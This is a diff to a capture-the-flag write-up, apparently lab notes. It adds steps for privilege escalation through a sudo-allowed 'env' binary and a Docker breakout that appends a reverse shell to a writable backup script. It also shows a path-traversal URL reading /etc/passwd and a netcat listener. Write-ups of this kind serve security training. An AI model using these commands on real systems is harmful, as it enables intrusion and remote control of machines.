@@ -80,11 +80,7 @@ http://10.10.228.190/?view=dog/../../../../etc/passwd&ext=
 
 
 
-**Kali**
 
-```
-e
-```
 
 <figure><img src="../../.gitbook/assets/image (397).png" alt=""><figcaption></figcaption></figure>
 
@@ -134,11 +130,52 @@ ctrl + Z
 stty raw -echo;fg
 ```
 
+## Privilege Escalation
+
+**Exploit:** [https://gtfobins.github.io/gtfobins/env/](https://gtfobins.github.io/gtfobins/env/)
+
+```
+sudo -l
+/usr/bin/env /bin/sh -p 
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+## Break out of Docker
 
 
 
+We get a hint we're actually in a docker container
 
+**Victim**
 
+```
+ls -lah /
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+We can see there is a backups folder that tars the contents of /root/container since we have access to edit this file we modify the file with a reverse shell
+
+**Victim**
+
+```
+cat /opt/backups/backup.sh
+echo "sh -i >& /dev/tcp/10.10.113.93/1440 0>&1" >> /opt/backups/backup.sh
+cat /opt/backups/backup.sh
+```
+
+**Kali**
+
+```
+nc -lvnp 1440
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
